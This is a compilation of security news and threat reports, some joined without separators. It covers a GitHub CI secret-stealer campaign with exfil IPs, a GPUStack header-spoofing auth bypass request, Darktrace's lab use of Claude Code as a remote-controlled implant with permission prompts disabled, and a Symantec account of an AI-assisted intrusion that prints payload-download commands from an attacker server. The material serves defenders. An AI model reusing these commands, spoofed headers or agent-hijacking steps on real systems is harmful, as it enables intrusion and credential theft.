ebe267d963aa.text: European tech buyers are increasingly choosing cybersecurity vendors from their own continent in a bid to reduce their reliance on American technology. Digital sovereignty isn't only prompting enterprise customers to question their clouds of choice, it is also reshaping other parts of the industry too, and the shift is marked. According to sales figures compiled by Context, distributor sales in EMEA of cybersecurity products from EU-headquartered vendors jumped 35 percent in the two years to calendar Q3 2026. Total cybersecurity sales grew up 10 percent over the same period, and sales by US-run companies went up just 8 percent. That growth is from a relatively small base, though EU vendors gained nearly three percentage points to reach 15 percent of tracked sales by value. There is still a long way to go as US-headquartered vendors accounted for 62 percent. The trend coincides with a loss of trust in the Trump administration among customers outside of America, after it cosied up to autocratic rulers while criticizing and punishing allies with tariffs and more. Context stopped short of assigning blame. It said organizations are reviewing their reliance on third-party tech in light of EU compliance regimes: the NIS2 Directive and Digital Operational Resilience Act (DORA). NIS2, transposed into national law in October 2024, requires organizations in the bloc to raise their common level of security in the face of digital threats and risks to critical infrastructure. DORA, introduced in January last year, is designed to strengthen cyber security in the financial sector. "Digital sovereignty is becoming a buying decision. As customers and resellers get clearer about what it means in practice, they're asking who holds the encryption keys, who can access sensitive logs and where that data is stored," said Context veep of research Joe Turner. "We're seeing a measurable shift in the EMEA channel. EU vendors gained nearly three points of sales share in two years. An organization can keep its existing identity platform and still choose a European supplier to manage its security logs. That's the kind of decision that gives European vendors an opening." The stats indicate that EU-HQd vendors comprised 92 percent of tracked sales in security awareness training, 82 percent in vulnerability management, and 52 percent for SIEM and log management. US-headquartered companies held into 74 percent of identity and access management sales and 54 percent of cloud security sales. The Reg has asked Context for UK-specific figures to see whether British customers are also voting with their wallets for European alternatives. That certainly isn’t the case for tech purchases in the British public sector, despite Prime Minister Andy Burnham’s professed desire to buy British. Data released yesterday by the Institute for Public Policy Research showed just £1 in every £6 spent by government with the biggest technology suppliers goes to Brit businesses. Still, Burnham only came to power in July so there is time yet for him to put his money where his mouth is. Sovereign AI is another area of concern for enterprise customers. Analyst Omdia said last month that despite the marketing adjective meaning "local assets," almost a third AI providers disclose no proof of sovereignty, and some "expect enterprise to pay for audits to verify their claims." Omdia also found that 80 percent of contracts say network resilience is "out of providers control or responsibility," and "US-headquartered AI providers offer better service transparency and contract terms than a majority of local sovereign AI providers, with providers in India a notable exception." Sovereign services in Omdia's classification include data residency, operational autonomy, jurisdictional sovereignty, and technological autonomy. "Local hosting is not sovereignty. Serious providers must demonstrate their credibility through transparent operations, fair contracts and proof of competence. That includes the network, because data in transit must be sovereign too," said Camille Mendler, research director for telco B2B at Omdia. Someone should tell Microsoft and Anthropic. ®

745adccc1295.text:
Starting Tuesday, an attacker used stolen credentials for 4,837 GitHub accounts to plant a secret stealer in repositories those accounts could write to, according to Aikido Security, a security software company.

The stealer is built to take the secrets and cloud credentials that a repository's CI workflows can reach. It ran in at least 1,806 repositories, where the attacker has likely collected those credentials, the company says.

Each attack started with a pull request titled docs: dependency audit notes, opened from a branch named wfx-docs to test whether the account could write to the repository. These test pull requests were opened in 61,764 repositories, and the stealer followed in some of them.

In a separate analysis, researchers at SafeDep, which sells software supply chain security tools, counted 8,093 repositories that received malicious commits between 12:46 UTC on Tuesday and 04:36 UTC today. That count covers every repository that received malicious commits, not only those where the stealer ran. Their search covered only the default branches of public repositories, so the true total is higher, the researchers say.

In 7,309 of those repositories, the stealer was added to an existing workflow. In 771, it came as an npm postinstall hook, which also runs on a developer's machine during npm install.

After pushing the stealer, the attacker usually reverted the change within minutes. Where the stealer ran, its logs were deleted, usually along with the run itself. In those repositories, every secret and cloud role available to the workflows should be treated as compromised.

More pull requests with the same title were opened early today, after the company's own GitHub search ended on Wednesday, a check by The Hacker News found. Three that were checked, opened between 05:04 and 05:38 UTC, came from wfx-docs branches. It is not clear whether the stealer followed.

Any account that opened one of the attacker's test pull requests is compromised, even if the stealer never ran, Aikido said in its technical analysis. The analysis does not explain how the attacker obtained the credentials.

SafeDep's researchers advise owners of affected repositories to revoke the commit author's tokens, OAuth app grants, SSH keys, and sessions, and to turn on 2FA. Owners should also rotate every secret and variable the repository can read. Anyone who ran npm install on an affected commit should treat that machine as compromised and rotate its keys.

In most other repositories that received a test, nothing was pushed afterward, or the stealer did not run due to the repository's settings or the account's permissions. The figures cover only the public repositories the company could see.

The tests also reached repositories that the compromised accounts did not own. Of the test pull requests, 10,431 were submitted via collaborator or organization access, and 92% of those were still open when the company checked.

Signs a Repository Was Hit

Check for these signs, from Tuesday onward, in any repository you can write to:

Branch: wfx-docs

Branch: chore/[a-z0-9]{8}, short-lived

Branch: ci-check-[0-9]{4}

Pull request title: docs: dependency audit notes

Commit message: ci: refresh build cache, which adds about 1,500 lines to an existing workflow

Commit message: chore: add ci helper, which adds a .ci-xxxxxx.sh script and a postinstall hook in package.json that runs it on any npm install

Commit message: chore: add dependency audit workflow, which adds .github/workflows/build-audit-xxxxxx.yml on a chore/ branch

Commit message: chore: initial commit, pushed before a new workflow file in an empty repository

Commit message: ci: restore

Commit message: ci: cleanup

SHA-256 (stealer script): 89695abb392d5cfd4972672961e644bb46baa98aa1ed7173c2a2816c762735cf

IP: 194.150.166[.]244:8080/exfil

IP: 18.143.168[.]96:8080/exfil

IP: 153.75.82[.]159:8080

A repository can show no wfx-loot artifacts, wfx- cache entries, or WFX-BEGIN step summaries and still have lost data. A missing run number on the attacker's commit is the more reliable sign that the stealer ran.

The stealer sends data by HTTP POST to the addresses above or to a Telegram chat, the SafeDep researchers found. In a sample of 200 payload commits, about a fifth used Telegram only.

The stealer is built to collect credentials from every source on the runner, according to the company. They include GitHub Actions secrets and variables, the workflow's GITHUB_TOKEN, OIDC and Actions runtime tokens, keys for AI services, and secrets in the memory of the runner's own processes. It reads credential files for AWS, Azure, GCP, Kubernetes, npm, PyPI, SSH, and other tools from their usual locations.

It also copies the repository, its last 100 commits, and recent workflow artifacts. On self-hosted runners, it takes cloud credentials from instance metadata as well as Docker container state and systemd units.

The stealer also has settings for private repositories, and the company says that suggests it may be running in them.

The stealer is designed to use those credentials to reach deeper into cloud accounts. It exchanges GitHub OIDC tokens for AWS, GCP, and Azure sessions, and on AWS it can create long-lived access keys for IAM users.

Some of its steps are built to survive credential rotation. It can rewrite an AWS role's trust policy to open the role to any AWS account.

It can also add federated identity credentials with the prefix wfx-ci- to Azure AD applications. Workflows in the compromised repository can then sign in to Azure without a stored secret, even after all tokens are rotated.

To find these backdoors, the researchers suggest checking for:

Entra ID: federated credentials named wfx-ci-* that you did not create

AWS CloudTrail: AssumeRoleWithWebIdentity or AssumeRole sessions named wfx-*, followed by CreateAccessKey or UpdateAssumeRolePolicy

GCP: GenerateAccessToken and SignJwt calls from your GitHub workload identity pool

Vault: JWT logins from the GitHub OIDC issuer

The stealer reached at least one Packagist package and one Go module through automated publishing triggers. At least 50 of the compromised users appear to publish packages for npm, Go, Packagist, PyPI, or crates.

The attacker appears to be after CI secrets rather than trying to spread through packages, the company says.

Version 3.14.3 of the Packagist package digitalelvis/neuronai-studio is malicious, and the company advises treating any machine that installed or opened it as compromised. Its package listing shows the version was published on Wednesday. Early today, the version was still listed, under a notice that versions of the package had been flagged as malware.

A normal composer install does not run the stealer, but running npm install inside the package's vendor directory does, the researchers found. Users should block v3.14.3 and pin v3.14.2 or earlier.

Two versions of the Go module github.com/onuragtas/docker-env, v1.0.278 and v1.0.280, carry the stealer only in a GitHub Actions workflow file. The Go code and release binaries are unchanged, and Go builds never run workflow files, so users of the module may not have been affected. The company still recommends removing those versions.

The researchers also found the stealer in another Go module, github.com/vkuznet/gocurl, in pseudo-version v0.0.0-20261111095532-8d5aad0cb0da, inside a workflow that has never run. Users should block that pseudo-version.

The stealer also reached 28 WebdriverIO repositories through commits authored as the bot account wdio-bot. No package release was affected, but the bot's token should be treated as stolen.

The company found that the accounts used this week overlap with those hit in GhostAction's October wave, in which stolen GitHub accounts pushed secret-stealing workflows into repositories.

Accounts hit in October were about 1,000 times more likely than other active accounts to be used this week. In more than 100 repositories, the new stealer was added to October's workflow files, leaving the older step that sends data out in place.

Aikido said, "we don't attribute November to the same actor at this stage," because the infrastructure, tools, and methods differ, and stolen credentials often end up with several attackers.

Correction (November 12, 2026): An earlier version of this article said the stealer sent data only by HTTP POST to two addresses and that the attacker reverted each change within a minute. A second analysis found a third server, a Telegram channel, and changes left in place for longer.

1f7826a42355.text:
A Microsoft research project combining AI agents with human security researchers uncovered 59 Linux kernel vulnerabilities, including bugs that had survived in production code for more than 20 years.

While AI dramatically accelerated the discovery process, the researchers found that validating flaws, developing patches, and working with maintainers remained overwhelmingly human-intensive.

The research, conducted by Microsoft’s FORGE Lab under the codename MDASH, generated 26,502 potential findings in approximately two weeks of scanning selected Linux kernel subsystems. Automated screening, proof-of-concept testing, and human validation narrowed these down to 59 public upstream reports, Microsoft said in a blog post.

“We developed working root privilege-escalation exploits for eight of those CVEs, and fixes for 38 of our reports have been merged into mainline,” the researchers said in the blog post.

From thousands of findings to 59 reports

Microsoft said it scanned selected kernel components covering networking, filesystems, and security modules. The initial findings were reduced to 11,769 candidates through automated screening. AI agents then attempted to reproduce potential vulnerabilities using QEMU, an open-source machine emulator.

This produced 621 cases with proof-of-concept evidence. Human researchers reviewed these cases to identify root causes, merge duplicates, and prepare upstream submissions, the blog post added.

Of the 621 cases, 59 resulted in public upstream reports. Microsoft said another 266 shared root causes with other findings and could be addressed through the same patch. A further 163 were not reported following review, mostly because of limited security impact, while 133 had already been reported or fixed upstream.

Microsoft said its first public report was submitted on June 27, 2026. By September 1, 55 of the 59 reports had been posted to public mailing lists. The remaining four were reported privately during the same period and routed to public lists by mid-October.

Of the 33 CVEs assigned to the findings, 24 carry a High or higher severity rating, based on CVSS v3.1 scores of at least 7.0, according to Microsoft.

Eight vulnerabilities had working exploits

The eight vulnerabilities for which Microsoft developed working local privilege-escalation exploits affect several kernel components, including IPv4 and IPv6 networking, IPsec routing, encrypted-key handling and the resizable hash-table implementation. Some demonstrations required non-default settings or disabled exploit mitigations, the researchers said.

One finding, CVE-2026-64563, involves the kernel’s rhashtable implementation, a shared resizable hash-table library used by different kernel subsystems.

Microsoft traced the flaw to a 2018 code change that allowed a table-walk operation to retain a pointer when paused. Under specific conditions involving table resizing and the removal of an entry, the kernel could subsequently access freed memory through that stale pointer.

The researchers identified an exploitable path through Netlink socket diagnostics, which are accessible to unprivileged users. By manipulating memory, an attacker could turn the flaw into a constrained kernel memory-write primitive that, combined with other exploitation techniques, could enable local privilege escalation, Microsoft explained.

The company said this vulnerability was exploitable on standard Linux configurations without requiring special kernel configurations or user namespaces. It also affected Android devices with SELinux enforcing.

Across the 59 reports, the average age of a bug was 8.1 years when Microsoft first reported it publicly. One vulnerability, CVE-2026-74544, had been present in the kernel for at least 21 years, the researchers said.

Patching remains a lengthy process

While AI agents helped identify potential vulnerabilities, generate proof-of-concept demonstrations and draft initial patches, Microsoft said human investigation remained necessary to validate findings and work with Linux kernel maintainers.

“Upstream Linux typically requires vulnerability reports to come with a working patch. Agents helped draft initial fixes, but human validation, subsystem understanding, and iterating with maintainers during review remained essential,” the researchers wrote.

Fixes for 38 of the 59 reports had been merged into the upstream Linux mainline at the time of publication. Half were accepted with the initial submission, while the others required between one and four revisions. The median time from the first public patch submission to a mainline release was 41 days, with the longest taking 108 days, Microsoft said. Work with maintainers on the remaining reports was continuing.

Microsoft said the initial scans took about two weeks, but converting the findings into validated reports and patches required more than four person-months of work.

“Finding bugs and fixing them are drastically out of balance,” the researchers wrote. “For complex infrastructure like the Linux kernel, keeping humans in the loop is still necessary, making human effort the bottleneck.”

The researchers said the project covered only a small fraction of the Linux kernel and that further tuning of the AI-assisted approach could uncover additional bugs. However, they cautioned that finding more vulnerabilities would not necessarily make systems more secure.

“More tokens may yield more bugs, but not a secure system,” the blog post concluded.

Another Way Police Are Locating People from Their Smartphones

Penlink’s Webloc is an application that locates people using information from the weather, gaming, email, and religious apps on their phone. It’s sold to the police.

The tool collects vast quantities of location data from smartphones via commonly used weather, gaming, email and religious apps. It can build a detailed picture of where a smartphone has been over the past 12 months, and update the data hourly, showing the movements of people on a near real-time basis. Law enforcement officers can use Webloc to zero in on a map and look at all phones that were present at a specific place and time, analyzing “billions of location data points,” according to company documents reviewed by Bloomberg.

CVE-2026-102895 is a trivial authentication-bypass vulnerability. GPUStack is also an attractive target. It is open-source software that manages clusters of GPUs, which are typically used to run AI workloads. All versions of GPUStack prior to 2.2.0, which was released at the end of June. This vulnerability was not made public until the end of July, and the CVE was assigned on November 4th.

The vulnerability stems from a common pattern: proxies add custom headers, and the recipient trusts them. An attacker can spoof these custom headers, thereby bypassing authentication and/or access control. In this particular case, the header in question is "X-Gpustack-Real-IP". Like similar headers (Forwarded, X-Forwarded-For, X-Real-IP), this header is intended to help identify the IP address from which the request originates. This is all nice and safe as long as no security decisions are made. But this is exactly what happens with GPUStack. If the "X-Gpustack-Real-IP" identifies loopback (127.0.0.1) as the source of the request, Gpustack bypasses authentication (after all, the request originates from a trusted source)

The requests we are seeing right now are pretty straightforward:

GET / HTTP/1.1 Host: [redacted] Accept-Encoding: identity User-Agent: Mozilla/5.0 X-Gpustack-Real-IP: 127.0.0.1

The IP address we see as the origin of these requests is 144.91.73.103. In the last couple of days, we have seen this IP look for other AI-related resources:

/v1/models /v1beta/models?key=x /v1/messages /models

https://github.com/gpustack/gpustack/security/advisories/GHSA-gj9m-f8ph-pmhr

All-in-one collaborative workspace and productivity platform Notion is notifying a small set of customers that their information was compromised in a data breach involving Fireworks AI.

A cloud platform for running and fine-tuning open source AI models, Fireworks AI was hacked twice in October: once through compromised internal credentials, and once through a third-party cloud provider that was hosting Fireworks R&D machines.

The second incident, linked to a recent rise in LLMJacking activity, occurred on October 24, when the attackers executed an unauthorized workload leading to the compromise of customer data.

Fireworks contained the incident the same day and notified Notion on November 2 that Notion AI data had been accessed. Prior to the incident, Notion used Fireworks as a general inference provider for delivering open-weight models.

Notion’s investigation into the compromised data determined that the hackers accessed Notion AI chat transcripts used for the Insights feature, which helps customers understand their AI usage.

Fewer than 1% of Notion workspaces were affected, and most of the transcripts were unattributable to a customer or the workspace they came from.

Advertisement. Scroll to continue reading.

“Beyond what’s in the chat transcript itself, there’s no information tying the chat back to workspaces, users or companies,” Notion says.

The company has contacted the affected customers with instructions on how to securely retrieve and review the data in their workspaces, but did not disclose how many customers were affected.

“We recommend treating this data as exposed. If you pasted sensitive information, passwords, API keys, or other credentials into Notion AI during the incident, rotate any exposed credentials,” Notion tells customers.

SecurityWeek has emailed Notion for additional information on the data breach and will update this article if the company responds.

29e73b83143f.text:
Microsoft Entra’s Hard Deletion Protection, now in preview, gives administrators a seven-day window to recover selected identities before they can be permanently erased.

The feature is designed to help organizations respond to accidental or malicious deletion of critical directory objects. It supports users that are not synchronized from on-premises systems, cloud-only groups, applications, and service principals. Entra Agent ID objects are covered through their underlying identity types.

How the recovery window works

Entra generally retains supported soft-deleted objects for 30 days, during which administrators can restore them. However, permanent deletion can end that recovery opportunity sooner.

Hard Deletion Protection blocks permanent removal during the first seven days after an object is soft deleted. It does not prevent the initial deletion, which makes the object inactive and can disrupt access to dependent services.

After seven days, permanent deletion is allowed. Restoring an object preserves its protection, and a subsequent deletion starts a new seven-day window.

Microsoft Entra Backup and Recovery cannot recover hard-deleted objects. They must be recreated and reconfigured, with new identifiers and access relationships that may need to be rebuilt.

Enabling protection

Configuration requires the Microsoft Entra Backup Administrator role. In the Entra Admin center, administrators open Backup and recovery, choose Hard deletion protection, and select Add protection.

Hard Deletion Protection (Source: Microsoft)

Each operation can protect up to 20 objects of one supported type. Enabling the feature is recorded in audit logs, and no additional license is required for the currently supported types.

Administrators must review the selection carefully, because protection cannot be disabled once enabled. If an administrator needs to permanently remove an object protected unintentionally, it must first be soft deleted, followed by the seven-day waiting period.

Monitoring deletions

Microsoft recommends tracking deletion events in Entra audit logs and exporting them to a security information and event management platform, such as Microsoft Sentinel.

Organizations can also use Entra Conditional Access protected actions to apply additional requirements to sensitive permissions, including permanent deletion of directory objects.

6e408189b39d.text:
Darktrace researchers turned Claude Code into a remote-controlled implant in a lab test, steering the coding agent through the memory stores feature of Anthropic’s Claude platform and pulling a 1 GB file out through the Claude Files API. Once the agent was set up, every job and every result traveled through api.anthropic.com, the endpoint the agent already calls for inference, so the attacker’s traffic looked like a coding agent doing its job.

The technique needs a head start. An attacker first has to compromise a developer’s machine and obtain the user’s Claude credentials, which in Darktrace’s scenario were sitting on the device where the user’s tooling had left them. The technique does not rely on a vulnerability in the Claude platform, and the company has not seen it used in the wild.

A shared notebook for commands

Memory stores are collections of text files attached to a Claude Console workspace, built so agents on Anthropic’s Claude Managed Agents service can remember things between sessions. The researchers found that a store can be added to a workspace through the API whether or not the organization uses Managed Agents.

The researchers created a store with three files. Each new Claude Code process wrote a check-in to a heartbeat file, read a job from an input file, carried it out, and posted results to an output file. The operator read the output and wrote the next job. Because the jobs are plain English, the operator can hand over an objective and let the model work out the commands.

Nine jobs, one domain account, a 1 GB file

The test ran on a simulated corporate Active Directory network. A small shell payload found Claude Code on a Linux machine, collected the credentials, and set up a systemd service that kept launching Claude Code processes with the --dangerously-skip-permissions flag, which turns off tool-use confirmation prompts.

The operator then sent nine jobs through the memory store. The agent mapped the local network, pulled employee names and a password from an anonymous FTP share, generated 190 candidate usernames, and sprayed the password at the domain controller and found the account it belonged to. It listed SMB shares with that account, downloaded a 1 GB file, split it into three pieces, and uploaded them to the Files API. The stolen data left the network for Anthropic’s servers. The names and credentials Darktrace published are fictitious.

Other platforms, other keys

Asked whether the pattern carries over to other AI agent platforms, Tim Bazalgette, Chief AI Officer at Darktrace, told Help Net Security: “We tested one platform and haven’t reproduced it elsewhere. The memory stores feature is specific to the Claude platform. The file-upload endpoint we used for exfiltration has an equivalent at OpenAI.”

“The key factor determining exposure is whether the provider’s API exposes services with text storage functionality alongside inference,” he said. “Beyond that, two things matter: how tightly credentials are scoped — here a standard API key reaches memory stores, while OAuth credentials don’t — and whether the customer can see writes to that store at all. None of those are flaws. They’re trade-offs between capability and exposure, worth examining in any agent platform you deploy.”

Darktrace shared the findings with Anthropic before publication, “as a courtesy – no formal disclosure process, because there’s no vulnerability to disclose,” Bazalgette said.

Lock down the keys, then watch the agent

Bazalgette splits the attack in two: getting into the AI system, which is fairly conventional, and using it for command and control and exfiltration once inside. Credentials matter for the first half. “In general, use OAuth or some form of identity federation wherever the platform allows it. Where that isn’t possible, make keys as short-lived as you can, keep their scope narrow, store them securely, and avoid exposing them anywhere they aren’t needed – shell history, dotfiles, environment variables and the like,” he said. “Treat an AI platform key as seriously as a production credential, because it now carries comparable capability.”

An attacker could also hijack an OAuth session, which Bazalgette said is harder to pull off. “And nothing in that second half is disallowed: no vulnerability, no guardrail bypass, no refusal, no malicious software and no strange destination,” Bazalgette said.

Darktrace’s detection advice rests on correlating what agent harness processes launch with the network traffic they generate, then comparing both against a baseline. A Claude Code process that runs tool calls and talks to Anthropic’s API is normal. What should catch your eye is that same process running tool calls with odd command-line arguments, or moving data to and from the API in a ratio that looks nothing like its usual traffic.

“What you’re left with is legitimate actions, through legitimate channels, with legitimate credentials, in a pattern bearing no resemblance to how that agent normally operates,” Bazalgette said. “Approved is not the same as safe, and only behaviour tells you the difference.”

Repositories give teams a managed source for build inputs. They proxy public registries, host internal components, and cache packages.

That work remains essential. But when more tools and teams contribute to a build, making software available is only part of the job.

A typical build may pull in open source packages, container images, internal libraries, build tools, and models. Those inputs can enter in several ways:

A developer selects a package or library.

A pipeline retrieves a component.

An AI agent adds a dependency while changing code.

A package manager resolves additional components required by another library.

Because many requests happen automatically, teams need to understand what is available through the repository path and manage the inputs that pass through it. A repository used as a common source can provide that operational inventory.

From Artifact Storage to Software Inventory

A repository inventory describes the artifacts available through a managed source: the formats and versions present, and the assets associated with them.

Sonatype Nexus Repository gives teams a shared view of components available through managed repositories.

That view can help answer questions such as:

Which packages, containers, models, and build artifacts are available through managed repositories?

Which versions are hosted or cached?

Do developers, pipelines, and agents have a common route to obtain software?

Can teams apply consistent policies and block known malicious packages before they are served?

Consider a routine library update. An engineer needs to know which versions are available through the team's standard source. When groups rely on separate proxies or caches, that information may be scattered. A shared repository gives teams a common place to check.

Know What the Repository Inventory Covers

A component appearing in Nexus Repository does not necessarily mean it is included in a deployed application. It means the component is managed or available through the repository. Build records or software bills of materials (SBOMs) identify what went into a specific application or release.

These views answer different but related questions. The repository inventory helps teams manage the shared supply path, and build records help them understand a particular application's inputs.

That distinction also gives teams a place to start an investigation. If a package is flagged, they can check whether it is managed or available through Nexus Repository, then consult build records to determine if a specific application included it.

Software Delivery Starts With What Teams Pull

Most applications depend on components their teams did not write. A developer might add a framework, then a package manager resolves its dependencies.

Each component can affect the application in different ways:

Compatibility: Dependencies may conflict or require specific versions.

Maintenance: Older or unsupported components create upgrade work.

Security: A malicious component requires investigation and response after it enters development.

When these issues surface after development begins, replacing a component can mean code changes, retesting, and release delays.

AI tools can add or update dependencies while changing code, increasing the pace of these choices. A faster request does not tell a team whether or not a component is compatible, maintained, or appropriate for the application. Teams need enough context to assess those choices before they create work downstream.

Make Centralized Access the Trusted Default

A shared repository gives teams a consistent place to proxy, store, and distribute the components and build inputs their workflows need. Developers and pipelines can use a managed route that supports their existing package managers and build tools, instead of relying on separate collections of external sources.

In day-to-day work, that shared route gives teams a common way to:

Retrieve components and resolve dependencies through the organization's configured source.

Manage the software supply chain used by multiple groups, rather than having each team create its own process.

Route AI agent dependency requests through the same access and intake controls used for other development activity.

Configure supported formats in a shared repository, giving new projects a starting point instead of another one-off source.

Centralizing access does not automatically cover packages downloaded directly from a public registry or through an unconfigured source. Teams need to route the requests they want managed through Nexus Repository. Then it can serve as a common point for understanding the inputs it handles and applying controls to them.

Block Known Malicious Packages Before They Reach the Build

Nexus Repository sits between upstream sources and the developers, pipelines, and agents requesting software. In the Pro+ and Enterprise editions, malicious package protection and configurable policies can block known malicious packages when requests pass through a protected repository path, before Nexus serves them downstream.

If a malicious package reaches a development environment, teams may need to remove it from the repository if it is still available, then:

Identify which developers, pipelines, or agents retrieved and used the package, and assess what systems or data may be affected.

Assess which systems or credentials it could access.

Determine whether builds or releases incorporated it, and assess downstream exposure.

Blocking the package at the repository can prevent that specific input from becoming part of a downstream investigation. Developers also do not have to identify every suspicious package name or track each campaign themselves. Protection applies where component requests already flow.

Repository protection does not address every dependency or application risk. A component can cause compatibility problems without being malicious, so teams still need testing and other controls throughout development. For dependency decisions and remediation, Sonatype Guide brings intelligence into developer and AI coding workflows to inform component choices and help automate dependency upgrades.

Within the broader Nexus One platform, Guide complements repository protection: developers and agents get support for choosing and updating dependencies, while Nexus Repository Pro+ and Enterprise can block known malicious packages and packages flagged as suspicious, even before they are confirmed as malicious at the repository request point.

Make the Repository Part of Delivery Infrastructure

A reliable software supply chain depends on more than where artifacts are stored. Teams need a consistent way to find the components their workflows can use, manage the route those components take, and keep known malicious packages out.

Nexus Repository provides a shared source for the software inputs it manages. Its Pro+ and Enterprise editions add protection that can block known malicious packages at the point where components enter the managed path. Together, these capabilities give teams both a clearer view of available inputs and a way to stop a known threat before it reaches a build.

As developers and AI agents make more requests, that combination becomes more useful. Teams can make software available through a common route, apply consistent controls to incoming requests, and understand the limits of what the repository inventory shows.

Know what your teams can get through the repository. Make trusted access the default. Block known malicious packages before they become part of the work.

How the attackers used AI

Phase one: hand-typed commands

Activity on the web server began on September 21, 2026, with a short burst of discovery commands, followed by a gap of about 12 hours. When it resumed on September 22, the commands showed the marks of manual typing. Across 110 distinct actions there were three typing errors (including systemifo and pwoershell), each corrected within seconds, and the command lengths averaged about 45 characters. The attackers re-ran the same blocked loader five times in about 20 minutes with no change of approach.

Phase two: AI-generated commands

On September 23, the attackers executed around 50 long scripts over roughly two hours. The median script ran to more than 500 characters, over 10 times the length of the hand-typed commands. None of the scripts contained a typing error. Each submission bundled several probes, labelled each result with a banner such as ===FILES MENTIONING CONN STRINGS===, wrapped cmdlets in error handling and capped the amount of output returned. That layout suits a consumer reading results back through a narrow text channel, and it is a common pattern in code generated by large language models (LLMs).

The strongest evidence of AI usage was in the comments. Several scripts opened with text that stated a hypothesis, cited earlier results and revised a previous conclusion before acting. One recorded that earlier negative results about a server had come from a SOCKS proxy channel known to report false successes, so the conclusion had to be re-measured from a host with a direct route. Human operators do not usually write that kind of deliberation into a one-shot web shell command.

An operator in the loop, not an autonomous agent

The gap between submissions never fell below seven seconds and longer pauses of two-to-eight minutes came before changes of strategy. There was no scanner-style burst activity and no fixed-interval beaconing. This is consistent with an operator copying output into an AI tool and pasting the next command into the web shell. Symantec assesses the AI assistance with high confidence and the operator-in-the-loop model with moderate confidence. The model or service involved could not be identified.

Similar labelled scripts also appeared on September 18, 2026 on three database servers in the same network, so the web server was not the first place the attackers appeared to use AI. Comments disappeared from the data between September 19 and 22 and returned in a different style, which may mean that more than one AI model was in use.

Tooling and tradecraft

DLL sideloading

The attackers downloaded an old, legitimate Bitdefender executable (bdreinit.exe) with a malicious DLL (log.dll) and a file named log.txt. The executable loads log.dll from its own folder, and the DLL reads and decrypts the text file, which holds the payload. The pairing has been documented in public reporting by Elastic and SecureWorks (now part of Sophos) on ShadowPad loaders. However, the bdreinit.exe and log.dll pairing has also been used by several threat actors in different operations, so it does not on its own identify the malware or the actor. A second set used a G DATA signed executable (ask.exe) with ask.dll and ask.txt.

ShadowPad is a modular remote access Trojan (RAT) that is closely associated with China-based APT groups. It is associated with various threat groups, particularly the APT41-nexus groups such as Blackfly, Grayfly and Redfly. It was documented being used by Glowworm in 2024, which was the first time that group had been observed using the malware. It has more recently been used in attacks where ransomware has been deployed. Typically, ShadowPad is loaded onto victim networks via DLL sideloading. DLL sideloading is a technique where the attackers use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious DLL payload.

Process-tree breaking

After repeated terminations, the attackers deployed a utility called BreakChain, which relaunches a target so that it no longer appears as a child of the IIS worker process (w3wp.exe). It offers five launch modes and the attackers used two, the WMI and shell modes. About 75 minutes after the first build was blocked, the attackers deployed a second build.

Yuze tunnelling tool

In the August 2026 intrusion at a different organization, the attackers ran Yuze to connect back to 204.194.49[.]129, the same server later used to stage payloads against the retailer. Yuze is a lightweight, open-source tunnelling tool that supports forward and reverse SOCKS5 proxies. Trend Micro has documented its use by Warlock ransomware attackers, and Warlock is developed by a China-nexus actor Symantec tracks as Longlegs (aka Storm-2603). Because Yuze is publicly available, its presence is not enough on its own to tie this activity to Warlock or Longlegs.

Attack chain: Intrusion against a U.S. retail organization

The initial infection vector is unknown. The earliest malicious activity took place on September 18, 2026, on three servers within the same organization (Computer 1, Computer 2 and Computer 3), all running Microsoft SQL Server. On each, malicious commands were launched as cmd.exe running directly under sqlservr.exe, which indicates that they were issued through the database service itself, most likely via its xp_cmdshell feature.

On Computer 2, the commands arrived as multi-part PowerShell scripts in which each section was introduced by a quoted text label, so that a single execution returned a structured report. This layout, together with the very short gaps between submissions, resembles output generated by an LLM rather than commands typed by hand, and it recurs throughout the intrusion.

"### whoami/priv ###"whoami /priv"### cmdkey ###"cmdkey /list"### RMS service accounts ###"Get-CimInstance Win32_Service | Where-Object {$_.PathName -match 'RMS|Store|Dynamics'} | Select-Object Name,StartName,PathName | Format-List | Out-String

Further scripts searched the point-of-sale synchronization directories for files containing credentials or connection strings. That the attackers went straight to these folders suggests that they had already identified the retail application. The scripts also tested whether the server could reach the internet by opening a TCP connection to 155.254.22[.]215 on port 9458. The attackers repeated this egress test on Computer 1 shortly afterwards.

The attackers then built a privilege escalation tool directly on Computer 2. Around 20 consecutive PowerShell commands appended base64-encoded text to a file in a new folder under ProgramData, which was decoded with Certutil and compiled with the .NET C# compiler, csc.exe. The source was EfsPotato, a publicly available exploit that abuses the Windows Encrypting File System RPC interface to run commands as SYSTEM. The payload saved the SAM, SYSTEM and SECURITY registry hives, from which an attacker can extract local NTLM password hashes, cached domain credentials and LSA secrets.

On September 21 a fourth computer (Computer 4), a Windows web server, appeared. Its malicious commands were launched as cmd.exe under w3wp.exe, which is characteristic of a compromised web application. A short burst of discovery was followed by a gap of about 12 hours.

When activity resumed on September 22, the commands showed signs of typing by a person, including the mistyped “systemifo” and “pwoershell,”. The attackers used Invoke-WebRequest to pull bdreinit.exe, log.dll and log.txt from 204.194.49[.]129 on port 8080 into the ProgramData folder:

powershell invoke-webrequest 204.194.49.129:8080/log.txt -OutFile CSIDL_COMMON_APPDATA\log.txtpowershell invoke-webrequest 204.194.49.129:8080/log.dll -OutFile CSIDL_COMMON_APPDATA\log.dllpowershell invoke-webrequest 204.194.49.129:8080/bdreinit.exe -OutFile CSIDL_COMMON_APPDATA\bdreinit.exe

Security terminated bdreinit.exe each time, but the attackers launched it roughly five times in less than 20 minutes, directly, through cmd.exe and through PowerShell. They then downloaded a PowerShell script, server.ps1, first from 166.0.25[.]106 and then from 154.81.37[.]136, which indicates fallback infrastructure. The script was an AES-encrypted PowerShell reverse shell that connects back to 166.0.25[.]106 on port 443. For persistent access that did not depend on the original entry point, the attackers also wrote two ASP web shells (filemanager.asp and qwdajhsd.asp) into the web application's images folder.

On September 23 the attackers returned to Computer 4, deleted the earlier files and staged a second side-loading set, ask.exe, ask.dll and ask.txt, launched with a -gdata argument. They also used an executable named mmc.exe, a name that mimics the Microsoft Management Console, as an intermediary to launch the others, presumably to change the parent process. After the launches were again terminated, they deleted the files and downloaded them once more. They then fetched a utility named BreakChainC.exe.

Shortly afterwards, the commands changed character again. For nearly two hours they were long, multi-part PowerShell scripts, often only seconds apart, with no typing errors, and labelled sections such as: ===FILES MENTIONING CONN STRINGS===. Each appeared to build on the output of the one before it. The attackers collected credentials from the web server, including: connection strings; the FileZilla Server user database; FileZilla, WinSCP and PuTTY client settings; saved RDP files; IIS configuration, and Windows logon registry values.

